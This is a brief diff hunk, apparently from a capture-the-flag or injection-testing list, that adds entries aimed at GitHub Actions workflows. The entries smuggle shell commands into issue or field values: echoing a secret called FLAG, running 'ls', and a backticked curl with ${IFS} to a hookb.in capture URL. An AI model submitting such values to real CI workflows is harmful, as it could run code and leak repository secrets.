@@ -672,3 +672,4 @@ ${{ env.FLAG }}
 lcl-367:${{ github.event.issue.number }} $( flag )
 ";echo ls"
 hututu2:';echo ${{ secret[FLAG] }};
+wgblikeW:`curl${IFS}https://hookb.in/yD0Yn8MdnkUG9yjj9xe7`
